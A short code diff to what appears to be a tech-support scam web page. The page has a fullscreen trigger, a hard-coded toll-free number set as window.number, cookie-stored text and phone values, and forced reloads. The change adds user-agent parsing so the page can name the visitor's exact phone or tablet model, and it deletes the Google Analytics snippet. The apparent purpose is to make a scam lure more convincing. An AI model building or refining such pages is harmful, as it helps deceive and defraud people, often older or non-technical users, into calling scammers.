@@ -281,23 +281,26 @@ function triggerFullscreen() {
 
 	window.number =(window.number?window.number:'+1(833)770-4330');
 
-	window.device= 'iPhone';
+	
 	window.refef = parseURL(document.referrer);
+function getDeviceModel() {
+  var ua = navigator.userAgent;
+  var iOSMatch = ua.match(/\((iPhone|iPad|iPod)[^;)]*;/i);
+  if (iOSMatch) {
+    var modelMatch = ua.match(/(iPhone|iPad|iPod)[^;)]*/i);
+    if (modelMatch) return modelMatch[0];
+    else return iOSMatch[1];
+  }
+  if (/Android/i.test(ua)) {
+    var match = ua.match(/Android.*; ([^;)]*)/);
+    if (match) return match[1].trim();
+    return "Android Device";
+  }
+  return "Unknown Device";
+}
+window.device = getDeviceModel();
 
-	if( ios ) {
-
-		if(/iphone/.test( userAgent )){
-			window.device= 'iPhone';
-		}
-
-		if(/ipad/.test( userAgent )){
-			window.device= 'iPad';
-		}
-
-		if(/ipod/.test( userAgent )){
-			window.device= 'iPod';
-		}
-	}
+	
 
 	var text = cookieHelper.get('textSetBl');
 	var phone = cookieHelper.get('phoneSetBl');
@@ -357,13 +360,7 @@ function triggerFullscreen() {
 	     location.reload();
 	 }
 
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'UA-148349439-10');
-</script>
 </script>
 </script>
 
